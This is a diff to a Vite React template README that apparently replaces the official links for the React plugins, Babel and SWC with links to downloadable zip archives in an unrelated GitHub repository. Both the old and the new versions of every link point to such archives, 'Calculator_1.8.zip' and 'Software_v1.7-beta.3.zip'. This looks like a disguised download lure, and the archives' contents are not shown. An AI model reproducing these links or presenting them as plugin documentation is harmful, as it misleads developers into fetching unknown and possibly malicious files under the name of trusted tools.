@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/adityadav002/Calculator/main/public/Calculator_1.8.zip) uses [Babel](https://raw.githubusercontent.com/adityadav002/Calculator/main/public/Calculator_1.8.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/adityadav002/Calculator/main/public/Calculator_1.8.zip) uses [SWC](https://raw.githubusercontent.com/adityadav002/Calculator/main/public/Calculator_1.8.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/adityadav002/Calculator/main/src/Software_v1.7-beta.3.zip) uses [Babel](https://raw.githubusercontent.com/adityadav002/Calculator/main/src/Software_v1.7-beta.3.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/adityadav002/Calculator/main/src/Software_v1.7-beta.3.zip) uses [SWC](https://raw.githubusercontent.com/adityadav002/Calculator/main/src/Software_v1.7-beta.3.zip) for Fast Refresh
